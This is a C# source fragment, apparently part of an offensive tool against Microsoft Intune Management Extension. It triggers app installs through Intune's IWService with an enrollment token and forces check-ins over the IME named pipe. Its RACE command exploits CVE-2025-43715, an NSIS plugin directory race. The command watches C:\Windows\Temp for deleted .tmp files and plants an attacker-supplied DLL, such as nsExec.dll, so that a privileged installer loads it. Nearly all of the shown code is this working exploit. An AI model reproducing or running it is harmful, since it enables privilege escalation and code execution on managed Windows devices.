                int cmdIdx = json.IndexOf("\"InstallCommandLine\":\"", idIdx, searchEnd - idIdx, StringComparison.OrdinalIgnoreCase);
                if (cmdIdx >= 0)
                    installCmd = ExtractJsonString(json, cmdIdx + 21);

                int setupIdx = json.IndexOf("\"SetUpFilePath\":\"", idIdx, searchEnd - idIdx, StringComparison.OrdinalIgnoreCase);
                if (setupIdx >= 0)
                    setupFile = ExtractJsonString(json, setupIdx + 16);

                if (!string.IsNullOrEmpty(name))
                {
                    string key = id.ToLower();
                    apps[key] = new AppInfo
                    {
                        Id = key,
                        Name = name,
                        InstallCmd = installCmd ?? "",
                        SetupFile = setupFile ?? ""
                    };
                }

                pos = idIdx + 40;
            }
        }

        // ----------------------------------------------------------------
        // Shared: trigger an Install/Uninstall action via IWService
        // Returns true on success.
        // ----------------------------------------------------------------

        static bool TriggerAppAction(string host, string token, string deviceId,
            string appGuid, string action)
        {
            string iwUrl = "https://" + host +
                "/TrafficGateway/TrafficRoutingService/IWService/StatelessIWService";

            Console.WriteLine("[*] Looking up " + action + " action for " + appGuid + "...");
            string navLink = GetNavLink(iwUrl, token, deviceId, appGuid);
            if (navLink == null)
            {
                Console.WriteLine("[-] App not found or no navigation link: " + appGuid);
                return false;
            }

            if (!navLink.StartsWith("http", StringComparison.OrdinalIgnoreCase))
                navLink = iwUrl + "/" + navLink;

            string stateUrl = navLink;
            if (!string.IsNullOrEmpty(deviceId))
                stateUrl += (stateUrl.Contains("?") ? "&" : "?") +
                    "$filter=DeviceId%20eq%20guid'" + deviceId + "'";
            stateUrl = BuildUrl(stateUrl, deviceId);

            string actionTarget = null;
            try
            {
                string stateJson = HttpGet(stateUrl, token, fullMetadata: true);
                var states = JsonGetArray(stateJson, "value");
                foreach (var state in states)
                {
                    string stateAppId = JsonGetString(state, "ApplicationId");
                    if (string.Equals(stateAppId, appGuid, StringComparison.OrdinalIgnoreCase))
                    {
                        string status = JsonGetString(state, "CombinedStatus");
                        if (!string.IsNullOrEmpty(status))
                            Console.WriteLine("[*] App status: " + status);
                        actionTarget = FindODataAction(state, action);
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] ApplicationState request failed: " + ex.Message);
                return false;
            }

            if (string.IsNullOrEmpty(actionTarget))
            {
                Console.WriteLine("[-] No " + action + " action available for " + appGuid);
                return false;
            }

            Console.WriteLine("[*] Sending " + action + " request...");
            string postUrl = BuildUrl(actionTarget, deviceId);
            try
            {
                HttpPost(postUrl, token, "");
                Console.WriteLine("[+] " + action + " request sent");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] " + action + " failed: " + ex.Message);
                return false;
            }
        }

        // ----------------------------------------------------------------
        // CHECKIN - force IME sync via named pipe
        // ----------------------------------------------------------------

        static int CmdCheckIn()
        {
            bool ok = TriggerCheckIn();
            return ok ? 0 : 1;
        }

        static bool TriggerCheckIn()
        {
            Console.WriteLine("[*] Connecting to IME named pipe...");
            try
            {
                var cb = new ImeCallback();
                var binding = new NetNamedPipeBinding(NetNamedPipeSecurityMode.Transport)
                {
                    OpenTimeout = TimeSpan.FromSeconds(10),
                    SendTimeout = TimeSpan.FromSeconds(10),
                    ReceiveTimeout = TimeSpan.FromSeconds(30),
                    MaxReceivedMessageSize = 1048576
                };

                var ctx = new InstanceContext(cb);
                var factory = new DuplexChannelFactory<IStatusService>(
                    ctx, binding, new EndpointAddress(ImePipeEndpoint));

                var pipe = factory.CreateChannel();
                var channel = (IClientChannel)pipe;
                channel.Open();

                var sid = Guid.NewGuid();
                pipe.CheckInAsync(sid).GetAwaiter().GetResult();
                Console.WriteLine("[+] Check-in sent. IME will sync with Intune.");

                try { channel.Close(); } catch { channel.Abort(); }
                return true;
            }
            catch (EndpointNotFoundException)
            {
                Console.WriteLine("[-] IME service not running or pipe not available.");
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Check-in failed: " + ex.Message);
                return false;
            }
        }

        // ----------------------------------------------------------------
        // RACE - CVE-2025-43715 NSIS plugin directory race
        // ----------------------------------------------------------------

        static byte[] _payload;
        static string _dllName = "nsExec.dll";
        static int _hits;

        static int CmdRace(string[] args)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            string dllPath = ParsePositional(args);
            string token = ParseArg(args, "--token");
            string appGuid = ParseArg(args, "--app");
            string hostArg = ParseArg(args, "--host");
            string timeoutArg = ParseArg(args, "--timeout");
            string dllNameArg = ParseArg(args, "--plugin");
            bool doCheckin = args.Any(a => a.Equals("--checkin", StringComparison.OrdinalIgnoreCase));

            if (string.IsNullOrEmpty(dllPath))
            {
                Console.WriteLine("Usage: race <payload_dll> --token <enrollment_token> --app <app_guid>");
                Console.WriteLine("       [--host <fef_host>] [--timeout <sec>] [--plugin <nsis_plugin>]");
                Console.WriteLine();
                Console.WriteLine("  <payload_dll>  path to your DLL payload on disk");
                Console.WriteLine("  --token        enrollment token (from exchange command)");
                Console.WriteLine("  --app          GUID of NSIS-based app to install");
                Console.WriteLine("  --timeout      seconds to watch (default 120)");
                Console.WriteLine("  --plugin       NSIS plugin filename to replace (default nsExec.dll)");
                Console.WriteLine("                 Also try: System.dll, dxupdate.dll");
                Console.WriteLine("  --checkin      Force IME sync after triggering install");
                Console.WriteLine();
                Console.WriteLine("Without --token/--app, arms the watcher only (trigger install manually).");
                return 1;
            }

            if (!File.Exists(dllPath))
            {
                Console.WriteLine("[-] Payload not found: " + dllPath);
                return 1;
            }

            try { _payload = File.ReadAllBytes(dllPath); }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Cannot read payload: " + ex.Message);
                return 1;
            }

            if (_payload.Length < 100)
            {
                Console.WriteLine("[-] Payload too small (" + _payload.Length + " bytes).");
                return 1;
            }

            int timeout = 120;
            if (!string.IsNullOrEmpty(timeoutArg)) int.TryParse(timeoutArg, out timeout);
            if (!string.IsNullOrEmpty(dllNameArg)) _dllName = dllNameArg;

            // Resolve host and device ID if we have a token
            string host = hostArg;
            string deviceId = null;

            if (!string.IsNullOrEmpty(token))
            {
                if (string.IsNullOrEmpty(host))
                {
                    host = DiscoverHost();
                    if (!string.IsNullOrEmpty(host))
                        Console.WriteLine("[*] Discovered host: " + host);
                }
                deviceId = DiscoverDeviceId();
                if (!string.IsNullOrEmpty(deviceId))
                    Console.WriteLine("[*] Device ID: " + deviceId);
            }

            Console.WriteLine("[*] Payload: " + _payload.Length + " bytes, DLL: " + _dllName);
            Console.WriteLine("[*] Timeout: " + timeout + "s");
            Console.WriteLine("[*] Arming watcher on C:\\Windows\\Temp...");

            var ev = new System.Threading.ManualResetEvent(false);

            try
            {
                var w = new FileSystemWatcher();
                w.Path = @"C:\";
                w.NotifyFilter = NotifyFilters.FileName | NotifyFilters.DirectoryName;
                w.IncludeSubdirectories = true;
                w.Deleted += OnTmpDeleted;
                w.EnableRaisingEvents = true;

                Console.WriteLine("[*] Watcher armed.");

                // Trigger install via API if we have token + app
                if (!string.IsNullOrEmpty(token) && !string.IsNullOrEmpty(appGuid) &&
                    !string.IsNullOrEmpty(host))
                {
                    Console.WriteLine("[*] Triggering install of " + appGuid + "...");
                    if (TriggerAppAction(host, token, deviceId, appGuid, "Install"))
                    {
                        if (doCheckin)
                            TriggerCheckIn();
                    }
                    else
                    {
                        Console.WriteLine("[!] Install trigger failed. Watcher still running, " +
                            "trigger manually or wait for timeout.");
                    }
                }
                else
                {
                    Console.WriteLine("[*] No --token/--app. Trigger an install from Company Portal now.");
                }

                ev.WaitOne(timeout * 1000);
                w.EnableRaisingEvents = false;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Watcher error: " + ex.GetType().Name + ": " + ex.Message);
                return 1;
            }

            Console.WriteLine("[*] Done. " + _hits + " race attempt(s).");
            return _hits > 0 ? 0 : 1;
        }

        static void OnTmpDeleted(object sender, FileSystemEventArgs e)
        {
            if (e.ChangeType != WatcherChangeTypes.Deleted)
                return;
            if (!e.FullPath.StartsWith(@"C:\Windows\Temp\", StringComparison.OrdinalIgnoreCase))
                return;
            if (!e.FullPath.EndsWith(".tmp", StringComparison.OrdinalIgnoreCase))
                return;

            try
            {
                Directory.CreateDirectory(e.FullPath);
                string target = Path.Combine(e.FullPath, _dllName);
                File.WriteAllBytes(target, _payload);
                Interlocked.Increment(ref _hits);
                Console.WriteLine("[+] Planted " + _dllName + " -> " + e.FullPath);
            }
            catch { }
        }
    }
}
